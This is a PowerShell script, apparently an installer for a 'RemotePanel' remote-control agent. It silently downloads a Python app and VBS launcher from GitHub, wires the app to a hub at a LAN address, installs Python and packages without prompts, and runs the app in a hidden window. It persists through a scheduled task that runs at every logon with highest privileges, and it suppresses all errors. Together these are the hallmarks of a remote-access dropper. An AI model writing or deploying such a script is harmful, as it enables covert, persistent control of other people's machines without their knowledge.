$ErrorActionPreference = "SilentlyContinue"
$folder = "$env:USERPROFILE\testemipo"
if (Test-Path "$folder\app.py") { exit }
New-Item -ItemType Directory -Path $folder -Force | Out-Null
$githubUser = "nohanvs"
$repo = "nohanpcs"
$baseUrl = "https://raw.githubusercontent.com/$githubUser/$repo/main"
Invoke-WebRequest -Uri "$baseUrl/app.py" -OutFile "$folder\app.py"
Invoke-WebRequest -Uri "$baseUrl/start.vbs" -OutFile "$folder\start.vbs"
$hubIp = "192.168.0.27"
$content = Get-Content "$folder\app.py" -Raw
$content = $content -replace 'HUB_URL = ""', "HUB_URL = `"http://${hubIp}:8000`""
Set-Content -Path "$folder\app.py" -Value $content -Encoding UTF8
$pyPath = "python"
$hasPython = $false
try {
    $ver = & python --version 2>&1
    if ($ver -match "Python 3") { $hasPython = $true; $pyPath = "python" }
} catch {}
if (-not $hasPython) {
    try {
        winget install Python.Python.3.12 --silent --accept-source-agreements --accept-package-agreements
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    } catch {
        $url = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
        $installer = "$env:TEMP\python-installer.exe"
        Invoke-WebRequest -Uri $url -OutFile $installer
        Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait -NoNewWindow
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    }
}
& python -m pip install flask psutil requests --quiet 2>$null
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "$folder"
WshShell.Run "python -B `"$folder\app.py`"", 0, False
"@
Set-Content -Path "$folder\start.vbs" -Value $vbsContent -Encoding ASCII
schtasks /create /tn "RemotePanel" /tr "wscript.exe `"$folder\start.vbs`"" /sc onlogon /rl highest /f | Out-Null
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$folder\start.vbs`"" -WindowStyle Hidden
Start-Sleep 3
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
Write-Host "Painel instalado: $hostname ($username)"
